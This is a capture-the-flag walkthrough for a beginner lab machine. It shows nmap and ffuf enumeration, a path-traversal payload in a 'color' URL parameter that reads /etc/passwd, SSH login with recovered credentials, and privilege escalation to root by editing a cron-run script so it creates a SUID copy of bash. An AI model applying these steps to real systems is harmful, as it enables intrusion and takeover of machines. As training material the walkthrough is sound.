
Documentation for the third box of the POC serie, a beginer box used to familarize with pentest tools and procedures.


# BOX POC 3

For this box, only an OVA for a virtual machine is provided, where I can see IP for beginning my pentest : 192.168.56.106, I put this in an $ip var.

---

## Summary

1. [Scan](#scan)
2. [Web Enumeration](#Web-Enumeration)
3. [SSH shell](#SSH-shell)

---

## Scan

We begin with a classic discovery of the network with this nmap command : ```nmap -sS -sV -sC -T4 $ip```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-18 10:37 CEST
Nmap scan report for 192.168.56.106
Host is up (0.00020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0e3ff44153b6271ab0a5c065b09d0b53 (RSA)
|   256 3891c5b542d638dc7245a7685e768099 (ECDSA)
|_  256 d7dc16365b235097ccfe2169b72a00d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Colors Change
MAC Address: 08:00:27:EF:0F:1C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

### Nmap scan summary

#### Port 22

Port 22 (SSH) is open and running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Possible bruteforce / weak user access. Version might be vulnerable.

#### Port 80

Port 80 (HTTP) is open and running Apache httpd 2.4.38 ((Debian))
Web service. We can start by exploring it manually and then fuzzing/enumeration.

## Web enumeration

With a web enumeration ```ffuf -c -w '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt' -u "http://$ip/FUZZ"```, I found a robot.txt, containing this :
```
Allow: /backup.zip
```

That mean that we can get this file, so I download it and unzip it with ```wget http://192.168.56.106/backup.zip && unzip backup.zip```to find the first flag inside ```index.php```.

```<?php #FLAG1{LA-VARIABLE-COLOR-EST-VULNERABLE-LFI} ?>```

The hint saying that the color variable is the vulnerability.

And the website is a basic "click to change the color" site, so when you click to a color, I seen in network inspector mode that the webservice send a request for changing the color.
As I can see too, the color is simply put in hexadecimal in the url like that : ```http://192.168.56.106/?color=%23cfc932```, so we can try to navigate through files like this :

```http://192.168.56.106/?color=../../../../../../etc/passwd``` 

And it worked :

<img width="696" height="841" alt="website passwd" src="https://github.com/user-attachments/assets/10a38baf-5b3c-4fad-9239-1b86eb9f7d1e" />

Here we can see two entries that can be interesting :

```
alix:x:1000:1000::/home/alix:/bin/bash
god:x:1001:1001::/home/god:/bin/bash
```

Thoses are probably usefull accounts and a potential target.
And in the "home" of www-data, the account used to manage webservice, ```http://192.168.56.106/?color=../../../../../var/www/html```, I can see a long character named file with the second flag inside :

```http://192.168.56.106/a74ae8e0d7cf015376f24c2fefdfe385193d62f0ac0184c3ddac7486b7fc116fa06c652f2602f8ba78bd89aade1ea4a242a12869e021d92a6d5e3c8f69f1bd0d/FLAG```

The flag saying that home directory is the key

```FLAG2{LE-REPERTOIRE-HOME-EST-LA-CLEE}```


So by navigating like that in the home, I can find the home of Alix :

```
drwxr-xr-x 3 alix alix  4096 Nov  1  2023 .
drwxr-xr-x 4 root root  4096 Jan 16  2022 ..
lrwxrwxrwx 1 root root     9 May 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 alix alix   125 Jan 16  2022 .hint
drwxr-xr-x 3 alix alix  4096 Jan 16  2022 .local
-rw-r--r-- 1 alix alix   807 Apr 18  2019 .profile
-rw-r--r-- 1 alix alix    31 Jan 16  2022 .secret-credentials
-rw-r--r-- 1 alix alix    39 Jan 16  2022 FLAG3.txt
-rwxrwxrwx 1 alix alix 18791 Jul 18 16:29 log
-rwxr-xr-x 1 alix alix    32 May 28  2022 script.sh
```

And here is the third flag ```FLAG3{LE-SCRIPT-EST-PAS-LA-PAR-HASARD}``` saying that the script is there for a reason, probably reffering to the script.sh.

Also the file .hint with this hint inside :
```
J'ai entendu dire qu'un utilisateur du systeme avait mis une tâche planifiée sur un script 

Peut être le "script.sh" ???
```

Meaning that a user may have added a scheduled task (crontab) on a script, maybe "script.sh".

And finaly the .secret-credentials with logins :

```
user: alix
password: Qwerty987
```

I try thoses logins with the ssh as we seen before that the 22 port is open, and bingo I'm logged as alix.


## SSH shell

So I need to use script.sh in order to escalate, first I look what does this script, it simply log the time in a log file inside alix home, usefull to know when the script run, and it run each minute.
I want to know who has put a crontab on this script so I add this line inside the script :

```
/usr/bin/date >> /home/alix/log
whoami >> /home/alix/log
```

And here is the result in the next entry :

```
mardi 22 juillet 2025, 13:01:01 (UTC+0200)
god
```

It seems that I'm logged as god, so I need to put the next lines in the script in order to copy the rootbash in my home so I can run it.

```
#!/bin/bash

sudo cp /bin/bash /home/alix/rootbash
sudo chmod 4777 /home/alix/rootbash
```

Here we are copying the binary file located at /bin/bash. This is the standard system-wide Bash binary — not a user-specific shell.
So it is not tied to the current user (god or otherwise). It simply copies the binary. And when we do it as sudo, the rootbash file is owned by root, then the permissions on this file is very important.
As we copy the bash, we change the permissions too, of course we need to execute it whoever the user is, but the most important is we need to apply the special user permission (SUID) with the 4000 permission digit.
It let us run the script at the owner permission of the script, so when the owner is root, we have then a rootbash.

```
ls -l rootbash
-rwsrwxrwx 1 root root 1168776 juil. 22 13:46 rootbash
```

We can see the rootbash is owned by root, and we can see the ```s``` instead of the first ```x```, meaning that there is indeed a special permission for the user part.
But when we run the rootbash this way :

```
alix@CTF-NOSTALGY-PIECE-OF-CAKE-3:~$ /home/alix/rootbash
rootbash-5.0$ whoami
alix
```

We are still logged as alix, so we need to use ```-p``` argument in order to not drop the permission and here we are, logged as root.

```
alix@CTF-NOSTALGY-PIECE-OF-CAKE-3:~$ /home/alix/rootbash -p
rootbash-5.0$ whoami
root
```

Then I found the fourth flag in the ```/home/god```

```
FLAG4{LES-DROITS-SUDO-SONT-LA-CLEE}
```

And finaly the fifth flag in the ```/root```

```
FLAG5{BEAU-TRAVAIL-BG}

           .'\   /`.
         .'.-.`-'.-.`.
    ..._:   .-. .-.   :_...
  .'    '-.(o ) (o ).-'    `.
 :  _    _ _`~(_)~`_ _    _  :
:  /:   ' .-=_   _=-. `   ;\  :
:   :|-.._  '     `  _..-|:   :
 :   `:| |`:-:-.-:-:'| |:'   :
  `.   `.| | | | | | |.'   .'
    `.   `-:_| | |_:-'   .'
      `-._   ````    _.-'
          ``-------''
```
